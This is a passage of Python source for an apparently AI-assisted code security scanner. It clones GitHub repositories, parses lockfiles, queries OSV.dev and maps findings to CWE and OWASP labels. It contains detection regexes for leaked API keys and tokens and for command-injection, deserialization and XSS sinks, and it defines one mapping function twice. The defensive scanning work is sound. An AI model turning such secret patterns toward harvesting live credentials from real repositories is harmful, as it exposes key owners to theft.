import asyncio
import glob
import httpx
import json
import logging
import os
import re
import shutil
import subprocess
import tempfile
import zipfile
from typing import List, Dict, Any, Tuple, Optional, Set
from backend.config import settings
from backend.services.entropy import calculate_shannon_entropy
from backend.services.redactor import auto_redact_all, redact_secret, redact_email
from backend.rules import get_known_cves

logger = logging.getLogger(__name__)

AI_FALLBACK_WARNING = "ai tidak dapat terhubung hasil mungkin halu atau sedikit tidak akurat"

# Pattern regex rahasia & tokens
REGEX_OPENAI = re.compile(r'(?:NEXT_PUBLIC_)?OPENAI(?:_API)?_KEY\s*[:=]\s*["\'](sk-[a-zA-Z0-9_\-]{20,})["\']')
REGEX_GENERIC_KEY = re.compile(r'["\'](sk-(?:proj-)?[a-zA-Z0-9_\-]{24,})["\']')
REGEX_GITHUB_TOKEN = re.compile(r'["\'](ghp_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9_]{40,})["\']')
REGEX_AWS_KEY = re.compile(r'["\'](AKIA[0-9A-Z]{16})["\']')
REGEX_STRIPE_KEY = re.compile(r'["\'](sk_live_[0-9a-zA-Z]{24,})["\']')
REGEX_SECRET_TOKEN = re.compile(r'(?:api_?key|secret|token|auth_?token|client_?secret|password)\s*[:=]\s*["\']([^"\']{16,100})["\']', re.IGNORECASE)

# Pattern XSS DOM Sinks
SINK_PATTERNS = [
    (re.compile(r'(\w+)\.innerHTML\s*=\s*([^;]+)'), "innerHTML Assignment"),
    (re.compile(r'dangerouslySetInnerHTML\s*=\s*\{\{\s*__html:\s*([^}]+)\}\}'), "dangerouslySetInnerHTML"),
    (re.compile(r'document\.write\(([^)]+)\)'), "document.write()"),
    (re.compile(r'eval\(([^)]+)\)'), "eval() execution")
]

# Pattern Blade Unescaped Output ({!! $var !!})
REGEX_BLADE_UNESCAPED = re.compile(r'\{!!\s*(\$[^!]+?)\s*!!\}')

# Pattern Raw SQL Injection
REGEX_RAW_SQL = re.compile(r'\b(?:DB::raw|whereRaw|selectRaw|havingRaw|orderByRaw)\s*\([^)]*\$')

# Pattern Command Injection
REGEX_CMD_INJECTION = re.compile(r'\b(exec|shell_exec|system|passthru|popen|proc_open)\s*\(\s*.*\$')

# Pattern Insecure Deserialization
REGEX_INSECURE_DESERIALIZE = re.compile(r'\bunserialize\s*\(\s*.*\$')

# Multi-language patterns for Deep SAST Heuristics
REGEX_PY_RAW_SQL = re.compile(
    r'(?:cursor\.(?:execute|executemany)|(?:session|db|engine)\.execute)\s*\(\s*(?:f["\']|["\'][^"\']*%s|["\'][^"\']*\.format\()',
    re.IGNORECASE
)
REGEX_PY_CMD_INJ = re.compile(
    r'\b(?:os\.(?:system|popen)|subprocess\.(?:Popen|call|run|check_output))\s*\(\s*.*(?:shell\s*=\s*True|\bf["\']|\+|\.format\()',
    re.IGNORECASE
)
REGEX_PY_DESERIAL = re.compile(
    r'\b(?:pickle\.loads?|_pickle\.loads?|yaml\.load\s*\([^,)]*\))\b'
)
REGEX_PY_WEAK_HASH = re.compile(
    r'\bhashlib\.(?:md5|sha1)\s*\('
)
REGEX_JS_CMD_INJ = re.compile(
    r'\b(?:child_process\.(?:exec|execSync)|exec|spawnSync)\s*\(\s*.*(?:`|\+|concat)',
    re.IGNORECASE
)
REGEX_JS_RAW_HTML = re.compile(
    r'(?:dangerouslySetInnerHTML\s*=\s*\{\{\s*__html:\s*|innerHTML\s*=\s*.*(?:`|\+))'
)
REGEX_GO_RAW_SQL = re.compile(
    r'\b(?:db\.(?:Query|QueryRow|Exec)|sqlx?\.(?:Query|Exec))\s*\(\s*(?:fmt\.Sprintf\(|"[^"]*"\s*\+)',
    re.IGNORECASE
)
REGEX_GO_CMD_INJ = re.compile(
    r'\bexec\.Command\s*\(\s*"(?:sh|bash)"\s*,\s*"-c"\s*,\s*.*(?:\+|fmt\.Sprintf)',
    re.IGNORECASE
)

def resolve_cwe_and_owasp(rule_id: str, title: str, category: str) -> Tuple[str, str, float]:
    """
    Menentukan CWE, OWASP Top 10 kategori, dan baseline CVSS score secara presisi berdasarkan indikator SAST.
    """
    t = (title or "").lower()
    r = (rule_id or "").lower()
    c = (category or "").lower()
    combined = f"{t} {r} {c}"

    if "xss" in combined or "unescaped" in combined or "blade" in combined:
        return "CWE-79", "A03:2021-Injection", 8.2
    if "sql" in combined or "sqli" in combined:
        return "CWE-89", "A03:2021-Injection", 8.9
    if "cmd" in combined or "command" in combined or "rce" in combined or "shell" in combined:
        return "CWE-78", "A03:2021-Injection", 9.8
    if "deserial" in combined or "pickle" in combined or "yaml" in combined:
        return "CWE-502", "A08:2021-Software and Data Integrity Failures", 9.0
    if "ssrf" in combined:
        return "CWE-918", "A10:2021-Server-Side Request Forgery (SSRF)", 8.6
    if "idor" in combined or "bola" in combined or "access control" in combined:
        return "CWE-639", "A01:2021-Broken Access Control", 7.5
    if "upload" in combined:
        return "CWE-434", "A04:2021-Insecure Design", 8.5
    if "mass assignment" in combined or "fillable" in combined:
        return "CWE-915", "A04:2021-Insecure Design", 6.8
    if "secret" in combined or "token" in combined or "key" in combined or "env" in combined:
        return "CWE-798", "A07:2021-Identification and Authentication Failures", 8.9
    if "crypto" in combined or "hash" in combined or "md5" in combined or "sha1" in combined:
        return "CWE-327", "A02:2021-Cryptographic Failures", 5.9
    if "cors" in combined or "csrf" in combined:
        return "CWE-942", "A01:2021-Broken Access Control", 6.5
    if "docker" in combined or "misconfig" in combined or "sqlite" in combined:
        return "CWE-200", "A05:2021-Security Misconfiguration", 6.5

    return "CWE-200", "A04:2021-Insecure Design", 7.0

# Pattern Email & Internal URLs
EMAIL_REGEX = re.compile(r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+")
INTERNAL_URL_REGEX = re.compile(r"https?://(?:[a-zA-Z0-9-]+\.)*(?:internal|staging|dev|local)[a-zA-Z0-9-./_]*")

IGNORED_DIRS = {
    ".git", ".svn", "node_modules", "vendor", "dist", "build",
    "coverage", ".next", ".nuxt", "__pycache__", ".pytest_cache",
    ".parcel-cache", ".cache", ".turbo", ".idea", ".vscode",
    "storage/logs", "assets", "sound", "public/assets", "public/sound"
}

SYSTEM_EXCLUDE_PARTS = {
    "tests", "test", "spec", "selenium-tests", "cypress", "playwright",
    "vendor", "node_modules", "dist", "build", "assets",
    "storage", "cache", ".git", "docs", "seeds", "seeders",
    "database/factories", "database/seeders",
    "public/build", "public/vendor", "public/css", "public/js",
    ".parcel-cache", ".cache", ".turbo", "sound"
}

def robust_json_parse(text: str) -> dict:
    text = (text or "").strip()
    if text.startswith("```json"):
        text = text[7:]
    elif text.startswith("```"):
        text = text[3:]
    if text.endswith("```"):
        text = text[:-3]
    text = text.strip()

    # 1. Parse langsung jika JSON valid murni
    try:
        return json.loads(text, strict=False)
    except Exception:
        pass

    # 2. Perbaiki trailing comma sebelum penutup kurung siku/kurawal
    fixed = re.sub(r',\s*([\]}])', r'\1', text)
    try:
        return json.loads(fixed, strict=False)
    except Exception:
        pass

    # 3. Escape backslash yang tidak valid dalam JSON (namespace PHP \App\..., \Illuminate\..., regex \d+, path windows \)
    fixed_slash = re.sub(r'\\(?![/"\\bfnrtu]|u[0-9a-fA-F]{4})', r'\\\\', fixed)
    try:
        return json.loads(fixed_slash, strict=False)
    except Exception:
        pass

    # 4. Ambil objek JSON { ... } terluar
    m = re.search(r'(\{[\s\S]*\})', fixed_slash)
    if m:
        try:
            return json.loads(m.group(1), strict=False)
        except Exception:
            pass

    # 5. Fallback ke array [ ... ]
    m_arr = re.search(r'(\[[\s\S]*\])', fixed_slash)
    if m_arr:
        try:
            arr = json.loads(m_arr.group(1), strict=False)
            return {"findings": arr}
        except Exception:
            pass

    raise ValueError("Gagal mem-parsing respons JSON AI")

def detect_code_language(file_path: str, snippet: Optional[str] = None) -> str:
    path = (file_path or "").lower().strip()
    base = os.path.basename(path)

    # 1. Exact filenames
    if base in ("dockerfile", "containerfile") or base.startswith("dockerfile."):
        return "dockerfile"
    if "nginx" in base or base.endswith(".conf"):
        return "nginx"
    if base in ("makefile", "gnumakefile"):
        return "makefile"
    if base in (".env", ".env.local", ".env.production", ".env.staging", ".env.example"):
        return "bash"

    # 2. File extensions
    if path.endswith((".blade.php", ".php", ".phtml", ".php3", ".php4", ".php5", ".phps")):
        return "php"
    if path.endswith((".py", ".pyw", ".pyi")):
        return "python"
    if path.endswith((".ts", ".tsx", ".mts", ".cts")):
        return "typescript"
    if path.endswith((".js", ".jsx", ".mjs", ".cjs")):
        return "javascript"
    if path.endswith(".go"):
        return "go"
    if path.endswith(".java"):
        return "java"
    if path.endswith((".kt", ".kts")):
        return "kotlin"
    if path.endswith(".rs"):
        return "rust"
    if path.endswith((".rb", ".erb", ".rake", "gemfile")):
        return "ruby"
    if path.endswith((".cs", ".csx")):
        return "csharp"
    if path.endswith((".c", ".h")):
        return "c"
    if path.endswith((".cpp", ".cc", ".cxx", ".hpp", ".hxx")):
        return "cpp"
    if path.endswith((".sh", ".bash", ".zsh")):
        return "bash"
    if path.endswith(".sql"):
        return "sql"
    if path.endswith((".html", ".htm")):
        return "html"
    if path.endswith((".css", ".scss", ".sass", ".less")):
        return "css"
    if path.endswith((".yaml", ".yml")):
        return "yaml"
    if path.endswith(".json"):
        return "json"
    if path.endswith((".xml", ".svg")):
        return "xml"
    if path.endswith(".sol"):
        return "solidity"
    if path.endswith(".vue"):
        return "vue"
    if path.endswith(".svelte"):
        return "svelte"
    if path.endswith((".tf", ".hcl")):
        return "terraform"

    # 3. Content heuristics from code snippet if available
    if snippet:
        s_low = snippet.lower()
        if "<?php" in s_low or "$this->" in s_low or "namespace app" in s_low or "artisan" in s_low:
            return "php"
        if any(k in snippet for k in ["def ", "import ", "from ", "class ", "@app.", "@router."]):
            return "python"
        if any(k in snippet for k in ["package ", "func ", "fmt.Print", "gin.", "http.HandleFunc"]):
            return "go"
        if any(k in snippet for k in ["public class ", "private void ", "System.out.println", "@SpringBoot"]):
            return "java"
        if any(k in snippet for k in ["fn ", "impl ", "pub struct ", "let mut "]):
            return "rust"
        if any(k in snippet for k in ["def ", "require '", "end", "attr_accessor"]):
            return "ruby"
        if any(k in snippet for k in ["namespace ", "using System", "public async Task"]):
            return "csharp"
        if any(k in snippet for k in ["interface ", "type ", "enum ", ": string", ": number", ": boolean", ": any", ": void", ": Promise<", "<T>"]) or re.search(r':\s*[A-Z][a-zA-Z0-9_<>\[\]]*\b', snippet):
            return "typescript"
        if any(k in snippet for k in ["const ", "let ", "function ", "var ", "console.log", "module.exports", "require("]):
            return "javascript"
        if any(k in snippet for k in ["SELECT ", "INSERT INTO ", "UPDATE ", "DELETE FROM", "CREATE TABLE"]):
            return "sql"

    return "plaintext"

def resolve_cwe_and_owasp(rule_id: str, title: str, category: str) -> Tuple[str, str, float]:
    combined = f"{rule_id} {title} {category}".lower()

    # 1. BOLA / IDOR / Access Control
    if any(k in combined for k in ["bola", "idor", "ownership", "object reference", "access control", "missing auth", "unauth"]):
        return "CWE-639", "A01:2021-Broken Access Control", 8.2
    # 2. Path Traversal
    if any(k in combined for k in ["traversal", "path manipulation", "arbitrary file read", "arbitrary file write"]):
        return "CWE-22", "A01:2021-Broken Access Control", 7.9
    # 3. SQL / NoSQL Injection
    if any(k in combined for k in ["sql injection", "sqli", "raw sql", "nosql"]):
        return "CWE-89", "A03:2021-Injection", 8.8
    # 4. Command Injection / RCE
    if any(k in combined for k in ["command injection", "rce", "remote code", "shell exec", "code execution"]):
        return "CWE-78", "A03:2021-Injection", 9.8
    # 5. XSS
    if any(k in combined for k in ["xss", "cross-site scripting", "unescaped echo", "innerhtml"]):
        return "CWE-79", "A03:2021-Injection", 7.6
    # 6. Template Injection (SSTI)
    if any(k in combined for k in ["ssti", "template injection", "jinja", "twig"]):
        return "CWE-1336", "A03:2021-Injection", 8.5
    # 7. Mass Assignment
    if any(k in combined for k in ["mass assignment", "parameter tampering", "fillable"]):
        return "CWE-915", "A04:2021-Insecure Design", 6.8
    # 8. Insecure File Upload
    if any(k in combined for k in ["file upload", "upload logic", "webshell"]):
        return "CWE-434", "A04:2021-Insecure Design", 8.4
    # 9. Race Condition / Concurrency
    if any(k in combined for k in ["race condition", "toctou", "concurrency", "double spend"]):
        return "CWE-362", "A04:2021-Insecure Design", 7.5
    # 10. SSRF
    if any(k in combined for k in ["ssrf", "server-side request", "webhook"]):
        return "CWE-918", "A10:2021-Server-Side Request Forgery", 8.6
    # 11. Insecure Deserialization
    if any(k in combined for k in ["deserializ", "pickle", "unserialize", "yaml load"]):
        return "CWE-502", "A08:2021-Software and Data Integrity Failures", 8.9
    # 12. Broken Crypto / Hashing / Secret Leaks
    if any(k in combined for k in ["hardcoded", "secret leak", "api key", "password hash", "md5", "sha1", "cryptograph"]):
        return "CWE-798" if "secret" in combined or "key" in combined else "CWE-327", "A02:2021-Cryptographic Failures", 7.8
    # 13. Security Misconfiguration / CORS
    if any(k in combined for k in ["cors", "debug mode", "misconfig", "exposed file"]):
        return "CWE-346" if "cors" in combined else "CWE-200", "A05:2021-Security Misconfiguration", 6.5

    return "CWE-639", "A01:2021-Broken Access Control", 7.5

def normalize_github_target(repo_url: str) -> Tuple[str, str, str]:
    clean = repo_url.strip().rstrip("/")
    if clean.endswith(".git"):
        clean = clean[:-4]

    if "github.com/" in clean:
        parts = clean.split("github.com/")[-1].split("/")
    else:
        parts = clean.split("/")

    if len(parts) >= 2:
        owner, repo_name = parts[0], parts[1]
    else:
        owner, repo_name = "target", parts[0]

    clone_url = f"https://github.com/{owner}/{repo_name}.git"
    return clone_url, owner, repo_name

SPARSE_EXCLUDE_PATTERNS = [
    "/*",
    "!*.mp4", "!*.mp3", "!*.wav", "!*.avi", "!*.mkv", "!*.mov",
    "!*.zip", "!*.tar*", "!*.gz", "!*.rar", "!*.7z",
    "!*.png", "!*.jpg", "!*.jpeg", "!*.gif", "!*.webp", "!*.ico",
    "!*.pdf", "!*.doc", "!*.docx", "!*.xls", "!*.xlsx",
    "!*.iso", "!*.bin", "!*.exe", "!*.dmg", "!*.mdb",
    "!**/.parcel-cache/**", "!**/node_modules/**", "!**/vendor/**",
    "!**/dist/**", "!**/build/**", "!**/storage/logs/**"
]

def _run_git_clone_sync(clone_url: str, branch: str, target_dir: str) -> bool:
    env = os.environ.copy()
    env["GIT_TERMINAL_PROMPT"] = "0"
    env["GIT_ASKPASS"] = "echo"

    # Strategi 1: Blobless Shallow Clone dengan Non-Cone Sparse-Checkout
    # Sangat cepat (1-4 detik). Menghindari unduhan file binary/media raksasa (.mp4, .mp3, .zip, .parcel-cache)
    # yang sering menyebabkan git clone hang atau timeout hingga ratusan detik.
    try:
        if os.path.exists(target_dir):
            shutil.rmtree(target_dir, ignore_errors=True)
        os.makedirs(target_dir, exist_ok=True)

        cmd_sparse = [
            "git", "clone",
            "--filter=blob:none",
            "--no-checkout",
            "--depth", "1",
            "-b", branch,
            clone_url,
            target_dir
        ]
        res = subprocess.run(cmd_sparse, env=env, capture_output=True, text=True, timeout=30)
        if res.returncode != 0:
            cmd_sparse_default = [
                "git", "clone",
                "--filter=blob:none",
                "--no-checkout",
                "--depth", "1",
                clone_url,
                target_dir
            ]
            res = subprocess.run(cmd_sparse_default, env=env, capture_output=True, text=True, timeout=30)

        if res.returncode == 0:
            subprocess.run(
                ["git", "sparse-checkout", "init", "--no-cone"],
                cwd=target_dir, env=env, capture_output=True, text=True, timeout=15
            )
            subprocess.run(
                ["git", "sparse-checkout", "set"] + SPARSE_EXCLUDE_PATTERNS,
                cwd=target_dir, env=env, capture_output=True, text=True, timeout=15
            )
            res_co = subprocess.run(
                ["git", "checkout", branch],
                cwd=target_dir, env=env, capture_output=True, text=True, timeout=30
            )
            if res_co.returncode != 0:
                res_co = subprocess.run(
                    ["git", "checkout"],
                    cwd=target_dir, env=env, capture_output=True, text=True, timeout=30
                )

            if res_co.returncode == 0 and os.path.exists(target_dir) and any(os.scandir(target_dir)):
                logger.info(f"Fast blobless sparse git clone berhasil: {clone_url}")
                return True
    except Exception as e:
        logger.warning(f"Fast blobless sparse git clone failed: {e}")

    # Strategi 2: Standard Shallow Clone (--depth 1)
    try:
        if os.path.exists(target_dir):
            shutil.rmtree(target_dir, ignore_errors=True)
        os.makedirs(target_dir, exist_ok=True)

        cmd_shallow = ["git", "clone", "--depth", "1", "-b", branch, clone_url, target_dir]
        res = subprocess.run(cmd_shallow, env=env, capture_output=True, text=True, timeout=40)
        if res.returncode == 0 and os.path.exists(target_dir) and any(os.scandir(target_dir)):
            logger.info(f"Standard shallow git clone berhasil: {clone_url}")
            return True

        if os.path.exists(target_dir):
            shutil.rmtree(target_dir, ignore_errors=True)
        os.makedirs(target_dir, exist_ok=True)

        cmd_fallback = ["git", "clone", "--depth", "1", clone_url, target_dir]
        res_fb = subprocess.run(cmd_fallback, env=env, capture_output=True, text=True, timeout=40)
        if res_fb.returncode == 0 and os.path.exists(target_dir) and any(os.scandir(target_dir)):
            logger.info(f"Fallback shallow git clone berhasil: {clone_url}")
            return True
    except Exception as e:
        logger.warning(f"Shallow git clone failed: {e}")

    return False

async def fetch_github_archive_zip(owner: str, repo: str, branch: str, target_dir: str) -> bool:
    branches_to_try = [branch, "main", "master"]
    async with httpx.AsyncClient(follow_redirects=True, timeout=35.0) as client:
        for b in branches_to_try:
            url = f"https://codeload.github.com/{owner}/{repo}/zip/refs/heads/{b}"
            try:
                resp = await client.get(url)
                if resp.status_code == 200 and len(resp.content) > 100:
                    zip_path = os.path.join(tempfile.gettempdir(), f"{owner}_{repo}_{b}.zip")
                    with open(zip_path, "wb") as f:
                        f.write(resp.content)
                    
                    with zipfile.ZipFile(zip_path, "r") as zip_ref:
                        for member in zip_ref.infolist():
                            fname = member.filename
                            if any(ignored in fname for ignored in [".parcel-cache", "node_modules", "vendor", ".git"]):
                                continue
                            if fname.lower().endswith((".mp4", ".mp3", ".wav", ".zip", ".tar", ".gz", ".mdb", ".png", ".jpg", ".jpeg", ".ico")):
                                continue
                            if member.file_size > 5_000_000:
                                continue
                            zip_ref.extract(member, target_dir)
                    
                    try:
                        os.remove(zip_path)
                    except Exception:
                        pass
                    return True
            except Exception:
                continue
    return False

def detect_tech_stack_from_dir(repo_dir: str) -> List[str]:
    stack: Set[str] = set()

    for root, dirs, files in os.walk(repo_dir):
        dirs[:] = [d for d in dirs if d not in IGNORED_DIRS]

        for file in files:
            name_lower = file.lower()
            if name_lower.endswith(".php"):
                stack.add("PHP")
            if name_lower.endswith(".blade.php"):
                stack.add("Blade")
            if file == "artisan":
                stack.add("Laravel")
            if name_lower.endswith((".js", ".jsx", ".mjs")):
                stack.add("JavaScript")
            if name_lower.endswith((".ts", ".tsx")):
                stack.add("TypeScript")
            if "tailwind" in name_lower:
                stack.add("Tailwind CSS")
            if "vite.config" in name_lower:
                stack.add("Vite")
            if name_lower.endswith(".py"):
                stack.add("Python")
            if file == "go.mod" or name_lower.endswith(".go"):
                stack.add("Go")
            if file in ("pom.xml", "build.gradle", "build.gradle.kts") or name_lower.endswith(".java"):
                stack.add("Java")
            if name_lower.endswith((".kt", ".kts")):
                stack.add("Kotlin")
            if file == "Cargo.toml" or name_lower.endswith(".rs"):
                stack.add("Rust")
            if file in ("Gemfile", "Rakefile") or name_lower.endswith((".rb", ".erb")):
                stack.add("Ruby")
            if name_lower.endswith((".csproj", ".sln", ".cs")):
                stack.add("C#/.NET")
            if name_lower.endswith(".vue"):
                stack.add("Vue.js")
            if name_lower.endswith(".svelte"):
                stack.add("Svelte")
            if name_lower.endswith(".sol"):
                stack.add("Solidity")
            if file == "Dockerfile" or file.startswith("docker-compose"):
                stack.add("Docker")
            if file in ("package.json", "package-lock.json"):
                stack.add("Node.js")
            if file in ("composer.json", "composer.lock"):
                stack.add("Composer")

            if file == "package.json":
                try:
                    full_p = os.path.join(root, file)
                    with open(full_p, "r", encoding="utf-8", errors="ignore") as f:
                        pj = json.load(f)
                        deps = {**pj.get("dependencies", {}), **pj.get("devDependencies", {})}
                        if "react" in deps:
                            stack.add("React")
                        if "vue" in deps:
                            stack.add("Vue.js")
                        if "svelte" in deps:
                            stack.add("Svelte")
                        if "next" in deps:
                            stack.add("Next.js")
                        if "tailwindcss" in deps:
                            stack.add("Tailwind CSS")
                except Exception:
                    pass

    ordered = []
    priority_order = [
        "Laravel", "PHP", "Blade", "React", "Vue.js", "Svelte", "Next.js", "Node.js",
        "TypeScript", "JavaScript", "Python", "Go", "Java", "Kotlin", "Rust", "Ruby",
        "C#/.NET", "Solidity", "Tailwind CSS", "Vite", "Docker"
    ]
    for t in priority_order:
        if t in stack:
            ordered.append(t)
    for extra in sorted(stack):
        if extra not in ordered:
            ordered.append(extra)

    return ordered or ["Source Code"]

def parse_repo_dependencies(repo_dir: str) -> Tuple[List[Dict[str, Any]], Dict[str, Set[str]]]:
    packages: List[Dict[str, Any]] = []

    code_corpus: List[str] = []
    for root, dirs, files in os.walk(repo_dir):
        dirs[:] = [d for d in dirs if d not in IGNORED_DIRS]
        for f in files:
            if f.endswith((".php", ".js", ".ts", ".jsx", ".tsx", ".py", ".blade.php")):
                p = os.path.join(root, f)
                try:
                    if os.path.getsize(p) < 500_000:
                        with open(p, "r", encoding="utf-8", errors="ignore") as fp:
                            code_corpus.append(fp.read(50_000))
                except Exception:
                    pass

    full_code_text = " ".join(code_corpus)

    def is_reachable(pkg_name: str) -> bool:
        short = pkg_name.split("/")[-1]
        patterns = [
            re.escape(pkg_name),
            rf"\b{re.escape(short)}\b"
        ]
        return any(re.search(pat, full_code_text, re.IGNORECASE) for pat in patterns)

    for root, dirs, files in os.walk(repo_dir):
        dirs[:] = [d for d in dirs if d not in IGNORED_DIRS]
        if "composer.lock" in files:
            lock_path = os.path.join(root, "composer.lock")
            try:
                with open(lock_path, "r", encoding="utf-8", errors="ignore") as f:
                    data = json.load(f)
                    for item in data.get("packages", []) + data.get("packages-dev", []):
                        name = item.get("name")
                        ver = item.get("version", "").lstrip("v")
                        if name and ver:
                            packages.append({
                                "name": name,
                                "version": ver,
                                "ecosystem": "Packagist",
                                "lockfile": os.path.relpath(lock_path, repo_dir),
                                "is_reachable": is_reachable(name)
                            })
            except Exception as e:
                logger.warning(f"Error parsing composer.lock: {e}")

        if "package-lock.json" in files:
            lock_path = os.path.join(root, "package-lock.json")
            try:
                with open(lock_path, "r", encoding="utf-8", errors="ignore") as f:
                    data = json.load(f)
                    pkgs_dict = data.get("packages", {})
                    if pkgs_dict:
                        for k, v in pkgs_dict.items():
                            name = k.replace("node_modules/", "")
                            ver = v.get("version", "")
                            if name and ver and not k.startswith("node_modules/"):
                                packages.append({
                                    "name": name,
                                    "version": ver,
                                    "ecosystem": "npm",
                                    "lockfile": os.path.relpath(lock_path, repo_dir),
                                    "is_reachable": is_reachable(name)
                                })
                    elif data.get("dependencies"):
                        for name, v in data.get("dependencies", {}).items():
                            ver = v.get("version", "")
                            if name and ver:
                                packages.append({
                                    "name": name,
                                    "version": ver,
                                    "ecosystem": "npm",
                                    "lockfile": os.path.relpath(lock_path, repo_dir),
                                    "is_reachable": is_reachable(name)
                                })
            except Exception as e:
                logger.warning(f"Error parsing package-lock.json: {e}")

        if "package.json" in files and not any(p["ecosystem"] == "npm" for p in packages):
            pj_path = os.path.join(root, "package.json")
            try:
                with open(pj_path, "r", encoding="utf-8", errors="ignore") as f:
                    pj = json.load(f)
                    all_deps = {**pj.get("dependencies", {}), **pj.get("devDependencies", {})}
                    for name, ver_str in all_deps.items():
                        clean_ver = re.sub(r"[\^~>=<]", "", ver_str).strip()
                        if clean_ver:
                            packages.append({
                                "name": name,
                                "version": clean_ver,
                                "ecosystem": "npm",
                                "lockfile": os.path.relpath(pj_path, repo_dir),
                                "is_reachable": is_reachable(name)
                            })
            except Exception:
                pass

        if "requirements.txt" in files:
            req_path = os.path.join(root, "requirements.txt")
            try:
                with open(req_path, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        if "==" in line:
                            parts = line.split("==")
                            name, ver = parts[0].strip(), parts[1].strip()
                            packages.append({
                                "name": name,
                                "version": ver,
                                "ecosystem": "PyPI",
                                "lockfile": os.path.relpath(req_path, repo_dir),
                                "is_reachable": is_reachable(name)
                            })
            except Exception:
                pass

    return packages, {}

async def query_osv_dev_batch(packages: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    cve_findings: List[Dict[str, Any]] = []
    if not packages:
        return cve_findings

    sampled_packages = packages[:60]
    queries = []
    for pkg in sampled_packages:
        queries.append({
            "package": {"name": pkg["name"], "ecosystem": pkg["ecosystem"]},
            "version": pkg["version"]
        })

    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            resp = await client.post("https://api.osv.dev/v1/querybatch", json={"queries": queries})
            if resp.status_code == 200:
                results = resp.json().get("results", [])
                seen_packages: Set[str] = set()
                for i, res in enumerate(results):
                    vulns = res.get("vulns", [])
                    if vulns and i < len(sampled_packages):
                        pkg_info = sampled_packages[i]
                        pkg_name = pkg_info["name"]
                        version = pkg_info["version"]
                        lockfile = pkg_info["lockfile"]
                        reachable = pkg_info["is_reachable"]

                        if pkg_name in seen_packages:
                            continue
                        seen_packages.add(pkg_name)

                        v = vulns[0]
                        vuln_id = v.get("id", "CVE-VULN")
                        aliases = v.get("aliases", [])
                        cve_alias = next((a for a in aliases if a.startswith("CVE-")), vuln_id)
                        summary = v.get("summary", "Kerentanan dependensi terdeteksi oleh OSV.dev")
                        
                        severity = "HIGH"
                        cvss_score = 7.5
                        db_specific = v.get("database_specific", {})
                        if isinstance(db_specific, dict):
                            sev_str = str(db_specific.get("severity", "")).upper()
                            if "CRITICAL" in sev_str:
                                severity, cvss_score = "CRITICAL", 9.5
                            elif "HIGH" in sev_str:
                                severity, cvss_score = "HIGH", 8.0
                            elif "LOW" in sev_str:
                                severity, cvss_score = "LOW", 3.8
                            elif "MODERATE" in sev_str or "MEDIUM" in sev_str:
                                severity, cvss_score = "MEDIUM", 6.5

                        cve_findings.append({
                            "id": f"cve-{vuln_id.lower()}-{pkg_name.replace('/', '-')}",
                            "rule_id": f"CVE-{cve_alias}",
                            "category": "CVE_DEPENDENCY",
                            "severity": severity,
                            "title": f"OSV.dev {cve_alias}: {summary} ({pkg_name}@{version})",
                            "cwe_id": "CWE-1395",
                            "owasp_category": "A06:2021-Vulnerable and Outdated Components",
                            "cvss_score": cvss_score,
                            "location": {
                                "source_origin": "PACKAGE_LOCK_SCA",
                                "path": f"{lockfile} ({pkg_name}@{version})",
                                "line_start": 1,
                                "line_end": 1
                            },
                            "redacted_code_snippet": f'"{pkg_name}": "{version}"',
                            "evidence_metadata": {
                                "package": pkg_name,
                                "version": version,
                                "osv_id": vuln_id,
                                "cve_alias": cve_alias,
                                "is_reachable_in_code": reachable,
                                "details": v.get("details", "")[:250]
                            }
                        })
    except Exception as e:
        logger.warning(f"Error querying OSV.dev: {e}")

    return cve_findings

def extract_php_methods(content: str) -> List[Tuple[str, str, str, int]]:
    pattern = re.compile(r'(?:public|protected|private)?\s+function\s+([a-zA-Z0-9_]+)\s*\(([^)]*)\)', re.MULTILINE)
    methods = []
    for match in pattern.finditer(content):
        name = match.group(1)
        params = match.group(2)
        start_pos = match.start()
        brace_pos = content.find('{', match.end())
        if brace_pos == -1:
            continue
        depth = 1
        curr = brace_pos + 1
        while curr < len(content) and depth > 0:
            if content[curr] == '{':
                depth += 1
            elif content[curr] == '}':
                depth -= 1
            curr += 1
        body = content[brace_pos:curr]
        line_no = content[:start_pos].count('\n') + 1
        methods.append((name, params, body, line_no))
    return methods

def collect_system_logic_files(repo_dir: str) -> List[Tuple[str, str]]:
    logic_files = []
    CONFIG_NAMES = {
        "dockerfile", "docker-compose.yml", "docker-compose.yaml",
        "nginx.conf", ".htaccess", "application.properties", "application.yml",
        ".env.example", "security.yaml", "settings.json"
    }

    for root, dirs, files in os.walk(repo_dir):
        rel_root = os.path.relpath(root, repo_dir).replace("\\", "/")
        dirs[:] = [
            d for d in dirs 
            if d.lower() not in SYSTEM_EXCLUDE_PARTS 
            and not d.startswith(".")
            and not any(ex in f"{rel_root}/{d}".lower() for ex in SYSTEM_EXCLUDE_PARTS)
        ]
        if any(ex in rel_root.lower().split("/") for ex in SYSTEM_EXCLUDE_PARTS):
            continue
        for file in files:
            file_lower = file.lower()
            rel_file = os.path.normpath(os.path.join(rel_root, file)).replace("\\", "/")
            if any(p in rel_file.lower().split("/") for p in SYSTEM_EXCLUDE_PARTS):
                continue
            if file_lower.endswith((".test.php", "test.php", ".min.js", ".min.css", ".md", ".json", ".lock", ".example", ".sample", ".txt", ".map", ".svg", ".png", ".jpg", ".ico", ".db", ".sqlite")):
                continue
            if any(term in file_lower for term in [".test.", "_test.", ".spec.", "_spec.", "seeder", "factory", "mock"]):
                continue

            rel_lower = rel_file.lower()
            is_logic = False

            # 1. Config & Infrastructure
            if file_lower in CONFIG_NAMES or file_lower.startswith("dockerfile"):
                is_logic = True
            elif ".github/workflows" in rel_lower and file_lower.endswith((".yml", ".yaml")):
                is_logic = True

            # 2. PHP backend logic & templates
            elif file_lower.endswith((".php", ".phtml", ".blade.php")):
                if "config/" in rel_lower and any(cfg in file_lower for cfg in ["session.php", "queue.php", "mail.php", "logging.php", "filesystems.php", "cache.php", "services.php"]):
                    continue
                if file_lower.endswith(".blade.php"):
                    if any(k in rel_lower for k in ["views/", "pages/", "components/", "layouts/", "admin/"]):
                        is_logic = True
                elif any(k in rel_lower for k in ["controller", "route", "middleware", "service", "model", "policy", "app/", "routes/", "src/"]):
                    is_logic = True
                else:
                    is_logic = True

            # 3. Python backend logic
            elif file_lower.endswith((".py", ".pyw")):
                if any(k in rel_lower for k in [
                    "controller", "router", "route", "middleware", "service", "handler",
